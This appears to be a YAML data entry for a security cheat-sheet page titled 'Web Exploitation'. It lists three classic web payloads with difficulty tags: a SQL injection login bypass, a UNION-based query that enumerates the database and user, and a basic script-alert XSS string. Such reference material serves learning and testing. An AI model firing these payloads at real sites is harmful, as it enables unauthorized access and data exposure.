---
title: "Web Exploitation"
id: "web"
icon: "material-symbols:language-rounded"
commands:
  - cmd: "' OR 1=1 --"
    desc: "SQLi Auth Bypass"
    difficulty: "Easy"
    tags: ["sqli", "auth"]

  - cmd: "UNION SELECT 1,2,3,database(),user()--"
    desc: "SQLi Union Enumeration"
    difficulty: "Medium"
    tags: ["sqli", "recon"]

  - cmd: "<script>alert('XSS')</script>"
    desc: "Basic XSS Payload"
    difficulty: "Easy"
    tags: ["xss", "client-side"]
---

